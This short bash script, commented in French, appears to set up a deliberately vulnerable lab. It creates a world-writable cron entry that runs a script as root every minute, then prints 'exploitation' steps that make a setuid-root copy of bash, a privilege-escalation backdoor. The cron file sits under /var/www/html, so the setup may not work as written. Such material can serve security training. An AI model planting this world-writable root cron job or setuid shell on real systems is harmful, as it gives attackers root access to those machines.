#!/bin/bash
# Création d'une tâche cron modifiable

mkdir -p /var/www/html/etc/cron.d/
echo "* * * * * root /var/www/html/tmp/malicious.sh" > /var/www/html/etc/cron.d/vuln_cron
chmod 777 /var/www/html/etc/cron.d/vuln_cron

echo "✅ Cron vulnérable. Exploitation :
echo '#!/bin/bash' > /var/www/html/tmp/malicious.sh
echo 'cp /bin/bash /var/www/html/tmp/rootbash && chmod 4755 /var/www/html/tmp/rootbash' >> /var/www/html/tmp/malicious.sh
chmod +x /var/www/html/tmp/malicious.sh"
